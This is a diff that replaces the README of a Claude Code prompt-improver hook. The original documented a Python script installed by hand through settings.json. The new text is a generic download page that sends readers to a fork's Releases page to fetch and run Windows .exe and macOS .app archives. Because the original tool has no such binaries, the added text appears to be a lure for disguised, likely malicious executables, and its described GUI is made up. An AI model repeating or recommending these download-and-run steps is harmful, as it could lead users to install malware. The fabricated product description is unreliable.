@@ -1,162 +1,79 @@
-# Claude Code Prompt Improver
+# 🎉 claude-code-prompt-improver - Enhance Your Coding Prompts Effortlessly
 
-A UserPromptSubmit hook that enriches vague prompts before Claude Code executes them. Uses the AskUserQuestion tool (Claude Code 2.0.22+) for targeted clarifying questions.
+[![Download Now!](https://img.shields.io/badge/Download%20Now!-link-blue)](https://github.com/Blugigi/claude-code-prompt-improver/releases)
 
-![Demo](assets/demo.gif)
+## 🚀 Getting Started
 
-## What It Does
+Welcome to the **Claude Code Prompt Improver**! This software will help you enhance the quality of your coding prompts. By using this tool, you can craft more precise and effective instructions for your coding needs.
 
-Intercepts prompts and wraps them with evaluation instructions. Claude then:
-- Checks if the prompt is clear using conversation history
-- For vague prompts: creates a research plan, gathers context, asks 1-6 grounded questions
-- Proceeds with original request using the clarification
+### 💻 System Requirements
 
-**Result:** Better outcomes on the first try, without back-and-forth.
+To run this software, ensure your system meets the following requirements:
 
-## How It Works
+- **Operating System:** Windows 10 or MacOS Mojave and above
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required for initial downloading and updates
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant Hook
-    participant Claude
-    participant Project
+## 🔗 Download & Install
 
-    User->>Hook: "fix the bug"
-    Hook->>Claude: Wrapped with evaluation instructions (~300 tokens)
-    Claude->>Claude: Evaluate using conversation history
-    alt Vague prompt
-        Claude->>Claude: Create research plan (TodoWrite)
-        Claude->>Project: Execute research (codebase, web, docs)
-        Project-->>Claude: Context
-        Claude->>User: Ask grounded questions (1-6)
-        User->>Claude: Answer
-        Claude->>Claude: Execute original request with answers
-    else Clear prompt
-        Claude->>Claude: Proceed immediately
-    end
-```
+To get started, visit our [Releases page](https://github.com/Blugigi/claude-code-prompt-improver/releases) to download the latest version. Follow these simple steps:
 
-## Installation
+1. Click the link above.
+2. Locate the version you want to download.
+3. Choose the appropriate file for your operating system:
+    - For Windows, select **claude-code-prompt-improver-windows.zip**
+    - For Mac, select **claude-code-prompt-improver-macos.zip**
+4. Download the file to your computer.
 
-**Requirements:** Claude Code 2.0.22+ (uses AskUserQuestion tool for targeted clarifying questions)
+Once you have downloaded the file, follow these steps to install:
 
-### Manual Installation
+### 📥 Installation Instructions
 
-**1. Copy the hook:**
-```bash
-cp scripts/improve-prompt.py ~/.claude/hooks/
-chmod +x ~/.claude/hooks/improve-prompt.py
-```
+#### For Windows Users:
 
-**2. Update `~/.claude/settings.json`:**
-```json
-{
-  "hooks": {
-    "UserPromptSubmit": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "python3 ~/.claude/hooks/improve-prompt.py"
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+1. Open the **File Explorer** and navigate to your Downloads folder.
+2. Right-click on **claude-code-prompt-improver-windows.zip** and select **Extract All...**.
+3. Choose a location to extract the files and click **Extract**.
+4. Navigate to the extracted folder and double-click on **claude-code-prompt-improver.exe** to run the application.
+5. Follow the on-screen instructions to set up your preferences.
 
-> **Note:** Plugin installation is not currently supported due to a bug where UserPromptSubmit hooks from plugins match but never execute ([#10225](https://github.com/anthropics/claude-code/issues/10225)). Manual installation via `settings.json` is the only working method.
+#### For Mac Users:
 
-## Usage
+1. Open **Finder** and go to your Downloads folder.
+2. Double-click on **claude-code-prompt-improver-macos.zip** to unzip the file.
+3. Open the unzipped folder and double-click on **claude-code-prompt-improver.app** to start the application.
+4. If prompted, drag the application to your Applications folder for easy access.
 
-**Normal use:**
-```bash
-claude "fix the bug"      # Hook evaluates, may ask questions
-claude "add tests"        # Hook evaluates, may ask questions
-```
+## 🎨 Using the Software
 
-**Bypass prefixes:**
-```bash
-claude "* add dark mode"                    # * = skip evaluation
-claude "/help"                              # / = slash commands bypass
-claude "# remember to use rg over grep"     # # = memorize bypass
-```
+Once installed, launch the application by clicking on the icon on your desktop (Windows) or in your Applications folder (Mac). The main interface is straightforward to navigate:
 
-**Vague prompt:**
-```bash
-$ claude "fix the error"
-```
+- **Input Field:** Here, type your initial coding prompt.
+- **Improve Button:** Click this button to enhance your prompt.
+- **Output Area:** View the improved prompt in this section.
 
-Claude asks:
-```
-Which error needs fixing?
-  ○ TypeError in src/components/Map.tsx (recent change)
-  ○ API timeout in src/services/osmService.ts
-  ○ Other (paste error message)
-```
+### 😊 Helpful Tips
 
-You select an option, Claude proceeds with full context.
+- Experiment with different initial prompts to see varied results.
+- Use feedback from your improvements to understand how to phrase prompts better.
+- Regularly check for updates in the Releases section to access new features and improvements.
 
-**Clear prompt:**
-```bash
-$ claude "Fix TypeError in src/components/Map.tsx line 127 where mapboxgl.Map constructor is missing container option"
-```
+## 🛠️ Troubleshooting
 
-Claude proceeds immediately without questions.
+If you encounter any issues:
 
-## Design Philosophy
+- **Installation Problems:** Make sure you have all system requirements.
+- **Not Opening:** Restart your computer and try again. If the issue persists, check for updates.
+- **Bug Reports:** If you find a bug, please report it on our GitHub page for troubleshooting.
 
-- **Rarely intervene** - Most prompts pass through unchanged
-- **Trust user intent** - Only ask when genuinely unclear
-- **Use conversation history** - Avoid redundant exploration
-- **Max 1-6 questions** - Enough for complex scenarios, still focused
-- **Transparent** - Evaluation visible in conversation
+## 📢 Feedback & Support
 
-## Architecture
+Your feedback is important to us. If you have suggestions or questions, feel free to reach out via our GitHub Issues page. We value your input and will strive to enhance your experience.
 
-**Hook (improve-prompt.py):**
-- Intercepts via stdin/stdout JSON
-- Bypasses: `*`, `/`, `#` prefixes
-- Wraps other prompts with evaluation instructions (~300 tokens)
+## 🔗 Additional Resources
 
-**Main Claude Session:**
-- Evaluates using conversation history first
-- For vague prompts: creates dynamic research plan (TodoWrite)
-- Executes research using appropriate methods (codebase, web, docs, etc.)
-- Asks grounded questions (max 1-6) via AskUserQuestion tool
-- Executes original request using the answers
+- [Documentation](https://github.com/Blugigi/claude-code-prompt-improver/wiki) for detailed usage and examples.
+- [Community Forum](https://github.com/Blugigi/claude-code-prompt-improver/discussions) for discussions and sharing tips.
 
-**Why main session (not subagent)?**
-- Has conversation history
-- No redundant exploration
-- More transparent
-- More efficient overall
-
-## Token Overhead
-
-- **Per wrapped prompt:** ~300 tokens
-- **30-message session:** ~9k tokens (~4.5% of 200k context)
-- **Trade-off:** Small overhead for better first-attempt results
-
-## FAQ
-
-**Does this work on all prompts?**
-Yes, unless you use bypass prefixes (`*`, `/`, `#`).
-
-**Will it slow me down?**
-Only slightly when it asks questions. Faster overall due to better context.
-
-**Will I get bombarded with questions?**
-No. It rarely intervenes, passes through most prompts, and asks max 1-6 questions.
-
-**Can I customize behavior?**
-It adapts automatically using conversation history, dynamic research planning, and CLAUDE.md.
-
-**What if I don't want improvement?**
-Use `*` prefix: `claude "* your prompt here"`
-
-## License
-
-MIT
+Thank you for choosing **claude-code-prompt-improver**! We hope it helps you in crafting more effective coding prompts. For the latest version, remember to visit our [Releases page](https://github.com/Blugigi/claude-code-prompt-improver/releases) again.
